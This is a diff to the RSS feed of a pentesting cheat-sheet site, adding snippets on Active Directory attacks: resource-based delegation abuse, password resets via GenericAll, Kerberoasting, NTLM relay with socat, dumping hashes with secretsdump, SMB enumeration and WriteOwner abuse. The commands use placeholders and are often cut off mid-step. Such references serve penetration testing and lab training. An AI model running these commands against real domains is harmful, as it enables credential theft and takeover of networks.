@@ -15,11 +15,32 @@
       <description>Abuse #1: RBCD Attack Linux 1. Find delegation # Check delegation sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k 2. Get a service ticket impacket-getST -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;TARGET_DOMAIN&amp;gt; -impersonate administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -self # Check forwardable flag describeTicket.py &amp;lt;TICKET_1&amp;gt;.ccache 3. RBCD Attack # Add delegation impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -delegate-from &amp;lt;USER&amp;gt; -delegate-to &amp;lt;TARGET_1&amp;gt; -action write -dc-ip &amp;lt;DC&amp;gt; -use-ldaps # Check sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k 4.</description>
     </item>
     <item>
+      <title>GenericAll</title>
+      <link>https://tldrbins.github.io/genericall/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericall/</guid>
+      <description>Abuse #1: Change target user password Linux Windows 0. Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add Full Control to current user dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target-dn &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -inheritance -action write -rights FullControl 2. Change password bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; set password &amp;lt;TARGET_USER&amp;gt; &amp;lt;NEW_PASSWORD&amp;gt; Ref: bloodyAD&#xA;1. Import PowerView.ps1 . .\PowerView.ps1 2. Change target user password $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;TARGET_USER&amp;gt; -AccountPassword $password Abuse #2: Get shadow credentials Linux 0.</description>
+    </item>
+    <item>
       <title>Kerberoasting</title>
       <link>https://tldrbins.github.io/roasting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/roasting/</guid>
       <description>AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/ -usersfile &amp;lt;USERS_FILE&amp;gt; -no-pass -dc-ip &amp;lt;DC&amp;gt; # Single user without creds impacket-GetNPUsers -no-pass -dc-ip &amp;lt;TARGET&amp;gt; &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; # Multiple valid usernames nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;lt;USERS_FILE&amp;gt; -p &amp;#39;&amp;#39; --asreproast as_rep_hashes.txt Kerberoasting (From Linux) Impacket nxc # Fix time skew sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -request &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; Note: Times skew have to be within 5 minutes in kerberos&#xA;# Kerberoasting without cred sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -no-preauth &amp;lt;USER_WITH_DONT_REQUIRE_PREAUTH&amp;gt; -usersfile &amp;lt;USERS_FILE&amp;gt; -dc-host &amp;lt;DC_IP&amp;gt; &amp;lt;DOMAIN&amp;gt;/ nxc ldap &amp;lt;DC_IP&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --kerberoasting kerberoast_hashes.</description>
+    </item>
+    <item>
+      <title>Kerberos</title>
+      <link>https://tldrbins.github.io/kerberos/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/kerberos/</guid>
+      <description>Users enum kerbrute kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; &amp;lt;USERNAMES_FILE&amp;gt; Ref: kerbrute&#xA;Usernames generator username-anarchy ./username-anarchy -i &amp;lt;USERS_FILE&amp;gt; | tee &amp;lt;USERNAMES_FILE&amp;gt; Ref: username-anarchy&#xA;Generate Kerberos ticket (From Linux) Kinit Impacket 1. Set up # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to &amp;#39;/etc/hosts&amp;#39; (Try different order if not work) &amp;lt;TARGET&amp;gt; &amp;lt;DC&amp;gt; &amp;lt;DOMAIN&amp;gt; # Step 2: Add domain controller as a DNS server to &amp;#39;/etc/resolv.</description>
+    </item>
+    <item>
+      <title>NTLM Relay Attack</title>
+      <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ntlm_relay_attack/</guid>
+      <description>NTLM Relay Attack 1. Run socat to redirect traffic (In Windows Target) # Upload socat.zip and unzip Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&amp;#39;c:\programdata\socat.zip&amp;#39;, &amp;#39;c:\programdata&amp;#39;) .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&amp;lt;LOCAL_IP&amp;gt;:80 Ref: socat&#xA;2. Enable webdav (In Windows Target) $Source = @&amp;#34; using System; using System.Text; using System.Security; using System.Collections.Generic; using System.Runtime.Versioning; using Microsoft.Win32.SafeHandles; using System.Runtime.InteropServices; using System.Diagnostics.CodeAnalysis; namespace JosL.WebClient{ public static class Starter{ [StructLayout(LayoutKind.Explicit, Size=16)] public class EVENT_DESCRIPTOR{ [FieldOffset(0)]ushort Id = 1; [FieldOffset(2)]byte Version = 0; [FieldOffset(3)]byte Channel = 0; [FieldOffset(4)]byte Level = 4; [FieldOffset(5)]byte Opcode = 0; [FieldOffset(6)]ushort Task = 0; [FieldOffset(8)]long Keyword = 0; } [StructLayout(LayoutKind.</description>
     </item>
     <item>
       <title>RPC</title>
@@ -34,6 +55,27 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secretsdump/</guid>
       <description>Convert ntds.dit to .sqlite ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite Ref: ntdsdotsqlite&#xA;With ntds.dit and SYSTEM hive impacket impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With Dcsync right impacket nxc impacket-secretsdump &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; nxc smb -dc-ip &amp;lt;DC&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; --ntds </description>
+    </item>
+    <item>
+      <title>SMB Enum</title>
+      <link>https://tldrbins.github.io/smb_enum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/smb_enum/</guid>
+      <description>SMB Share Enum nmap sudo nmap --script=smb-enum-shares -p 445 &amp;lt;TARGET&amp;gt; Anonymous Login smbmap smbclient impacket smbmap -H &amp;lt;TARGET&amp;gt; --no-banner smbmap -H &amp;lt;TARGET&amp;gt; -u null --no-banner # List known share smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ # After found an accessible share smbclient -N \\\\&amp;lt;TARGET&amp;gt;\\&amp;lt;SHARE&amp;gt;\\ # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ --option=&amp;#39;client min protocol=NT1&amp;#39; # SID brute, if null auth allowed impacket-lookupsid test@&amp;lt;DOMAIN&amp;gt; -no-pass Authenticated smbmap smbclient smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # List known share smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -R &amp;lt;SHARE&amp;gt; # Download file smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; --download &amp;lt;PATH_TO_FILE&amp;gt; # List files with regex pattern smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -r &amp;lt;SHARE&amp;gt; -A &amp;lt;FILE_PATTERN&amp;gt; smbclient -L \\\\&amp;lt;TARGET&amp;gt;\\ -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; # After found an accessible share smbclient \\\\&amp;lt;TARGET&amp;gt;\\&amp;lt;SHARE&amp;gt;\\ -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; Authenticated with Kerberos impacket impacket-smbclient &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt;&amp;#39; -k -no-pass Basic commands # List all files in a share recurse ON ls # Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * List Alternate Data Streams (ADS) allinfo &amp;lt;FILE&amp;gt; # Example Response &amp;gt;&amp;gt;&amp;gt;stream: [:Password:$DATA], 15 bytes # Download specific data stream get &amp;#34;&amp;lt;FILE&amp;gt;:Password&amp;#34; Mount SMB Share Anonymous Authenticated sudo mount -t cifs //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt sudo mount -t cifs -o ro,user=&amp;lt;USER&amp;gt;,password=&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt Check write permission sudo find .</description>
+    </item>
+    <item>
+      <title>Windows RPC</title>
+      <link>https://tldrbins.github.io/windows_rpc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/windows_rpc/</guid>
+      <description>Windows RPC impacket IOXIDResolver # Show mappings impacket-rpcmap &amp;#39;ncacn_ip_tcp:&amp;lt;TARGET&amp;gt;&amp;#39; # Get network interface without auth python3 IOXIDResolver.py -t &amp;lt;TARGET&amp;gt; Ref: IOXIDResolver</description>
+    </item>
+    <item>
+      <title>WriteOwner/Own</title>
+      <link>https://tldrbins.github.io/writeowner/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writeowner/</guid>
+      <description>Abuse #1 : Change owner of the group Windows 1. Import PowerView . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity &amp;lt;TARGET_GROUP&amp;gt; -OwnerIdentity &amp;lt;TARGET_USER&amp;gt; Abuse #2 : Add user to the group Linux Windows 0. Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add full control permission to the user over the group sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target &amp;lt;TARGET_GROUP&amp;gt; -inheritance -action write -rights FullControl 2.</description>
     </item>
   </channel>
 </rss>
